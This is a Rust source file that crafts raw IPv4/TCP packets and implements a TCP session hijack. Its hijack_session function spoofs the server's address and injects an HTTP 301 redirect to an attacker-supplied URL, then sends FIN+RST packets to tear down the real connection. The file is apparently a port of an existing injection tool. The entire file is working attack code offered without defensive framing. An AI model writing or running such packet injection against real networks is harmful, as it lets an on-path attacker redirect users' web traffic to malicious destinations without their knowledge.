use std::net::Ipv4Addr;

/// Create a raw socket (AF_INET, SOCK_RAW, IPPROTO_RAW) for sending crafted packets.
pub fn create_raw_socket() -> Result<i32, String> {
    unsafe {
        let sock = libc::socket(libc::AF_INET, libc::SOCK_RAW, libc::IPPROTO_RAW);
        if sock < 0 {
            return Err("Failed to create raw socket".to_string());
        }
        // Set IP_HDRINCL so we provide our own IP header
        let one: libc::c_int = 1;
        if libc::setsockopt(
            sock,
            libc::IPPROTO_IP,
            libc::IP_HDRINCL,
            &one as *const _ as *const libc::c_void,
            std::mem::size_of::<libc::c_int>() as u32,
        ) < 0
        {
            libc::close(sock);
            return Err("setsockopt IP_HDRINCL failed".to_string());
        }
        Ok(sock)
    }
}

/// Internet checksum (RFC 1071).
fn checksum(data: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    let mut i = 0;
    while i + 1 < data.len() {
        sum += u16::from_be_bytes([data[i], data[i + 1]]) as u32;
        i += 2;
    }
    if i < data.len() {
        sum += (data[i] as u32) << 8;
    }
    while sum >> 16 != 0 {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    !(sum as u16)
}

/// Build an IP header (20 bytes).
fn build_ip_header(
    src: Ipv4Addr,
    dst: Ipv4Addr,
    total_len: u16,
) -> [u8; 20] {
    let mut hdr = [0u8; 20];
    hdr[0] = 0x45; // version 4, IHL 5
    // hdr[1] = 0;  // TOS
    let len_bytes = total_len.to_be_bytes();
    hdr[2] = len_bytes[0];
    hdr[3] = len_bytes[1];
    // hdr[4..6] = id (0)
    // hdr[6..8] = flags + fragment offset (0)
    hdr[8] = 255; // TTL
    hdr[9] = 6; // Protocol: TCP
    // hdr[10..12] = checksum (compute later)
    hdr[12..16].copy_from_slice(&src.octets());
    hdr[16..20].copy_from_slice(&dst.octets());

    // Compute IP checksum
    let csum = checksum(&hdr);
    let csum_bytes = csum.to_be_bytes();
    hdr[10] = csum_bytes[0];
    hdr[11] = csum_bytes[1];

    hdr
}

/// Build a TCP header (20 bytes) + payload.
fn build_tcp_segment(
    src_port: u16,
    dst_port: u16,
    seq: u32,
    ack_seq: u32,
    flags: u8,
    payload: &[u8],
    src_ip: Ipv4Addr,
    dst_ip: Ipv4Addr,
) -> Vec<u8> {
    let tcp_len = 20 + payload.len();
    let mut seg = vec![0u8; tcp_len];

    // Source port
    seg[0..2].copy_from_slice(&src_port.to_be_bytes());
    // Dest port
    seg[2..4].copy_from_slice(&dst_port.to_be_bytes());
    // Sequence number
    seg[4..8].copy_from_slice(&seq.to_be_bytes());
    // Ack number
    seg[8..12].copy_from_slice(&ack_seq.to_be_bytes());
    // Data offset (5 words = 20 bytes) + reserved
    seg[12] = 0x50;
    // Flags
    seg[13] = flags;
    // Window size
    seg[14..16].copy_from_slice(&65535u16.to_be_bytes());
    // Checksum (compute later)
    // Urgent pointer = 0

    // Copy payload
    if !payload.is_empty() {
        seg[20..].copy_from_slice(payload);
    }

    // Compute TCP checksum with pseudo-header
    let csum = tcp_checksum(&seg, src_ip, dst_ip);
    seg[16..18].copy_from_slice(&csum.to_be_bytes());

    seg
}

/// TCP checksum with pseudo-header.
fn tcp_checksum(tcp_segment: &[u8], src: Ipv4Addr, dst: Ipv4Addr) -> u16 {
    let tcp_len = tcp_segment.len() as u16;

    // Build pseudo-header (12 bytes)
    let mut pseudo = Vec::with_capacity(12 + tcp_segment.len());
    pseudo.extend_from_slice(&src.octets());
    pseudo.extend_from_slice(&dst.octets());
    pseudo.push(0); // reserved
    pseudo.push(6); // protocol TCP
    pseudo.extend_from_slice(&tcp_len.to_be_bytes());
    pseudo.extend_from_slice(tcp_segment);

    checksum(&pseudo)
}

/// Send a raw IP+TCP packet.
fn send_packet(sock: i32, packet: &[u8], dst: Ipv4Addr) {
    unsafe {
        let mut addr: libc::sockaddr_in = std::mem::zeroed();
        addr.sin_family = libc::AF_INET as libc::sa_family_t;
        addr.sin_addr.s_addr = u32::from(dst).to_be();

        libc::sendto(
            sock,
            packet.as_ptr() as *const libc::c_void,
            packet.len(),
            0,
            &addr as *const libc::sockaddr_in as *const libc::sockaddr,
            std::mem::size_of::<libc::sockaddr_in>() as u32,
        );
    }
}

/// Hijack a TCP session by sending an HTTP 301 redirect + RST.
/// This matches the original `HijackSession()` function.
///
/// Sends 3 attempts (retry loop), each consisting of:
/// 1. PSH+ACK+FIN with HTTP 301 redirect body
/// 2. FIN+RST to tear down the connection
pub fn hijack_session(
    sock: i32,
    src_ip: Ipv4Addr,
    dst_ip: Ipv4Addr,
    src_port: u16,
    dst_port: u16,
    seq: u32,
    ack: u32,
    payload_len: u32,
    redirect_url: &str,
    version: &str,
) {
    // Build HTTP 301 redirect response
    let http_response = format!(
        "HTTP/1.0 301 Moved Temporary\r\n\
         Content-Length: 0\r\n\
         Location: http://{}{}\r\n\
         Connection: close\r\n\
         Content-type: text/plain\r\n\r\n",
        redirect_url, version
    );
    let http_bytes = http_response.as_bytes();

    for _ in 0..3 {
        // Packet 1: PSH+ACK+FIN with HTTP redirect body
        // Note: src/dst are swapped (we're responding AS the server)
        let tcp1 = build_tcp_segment(
            dst_port,                     // server port (80)
            src_port,                     // client port
            ack,                          // our seq = their ack
            seq.wrapping_add(payload_len), // our ack = their seq + data len
            super::packet::TH_PUSH | super::packet::TH_ACK | super::packet::TH_FIN,
            http_bytes,
            dst_ip, // src = server IP
            src_ip, // dst = client IP
        );
        let total_len1 = 20 + tcp1.len();
        let ip1 = build_ip_header(dst_ip, src_ip, total_len1 as u16);
        let mut pkt1 = Vec::with_capacity(total_len1);
        pkt1.extend_from_slice(&ip1);
        pkt1.extend_from_slice(&tcp1);
        send_packet(sock, &pkt1, src_ip);

        // Packet 2: FIN+RST to tear down
        let tcp2 = build_tcp_segment(
            dst_port,
            src_port,
            ack.wrapping_add(1),
            0,
            super::packet::TH_FIN | super::packet::TH_RST,
            &[],
            dst_ip,
            src_ip,
        );
        let total_len2 = 20 + tcp2.len();
        let ip2 = build_ip_header(dst_ip, src_ip, total_len2 as u16);
        let mut pkt2 = Vec::with_capacity(total_len2);
        pkt2.extend_from_slice(&ip2);
        pkt2.extend_from_slice(&tcp2);
        send_packet(sock, &pkt2, src_ip);
    }
}
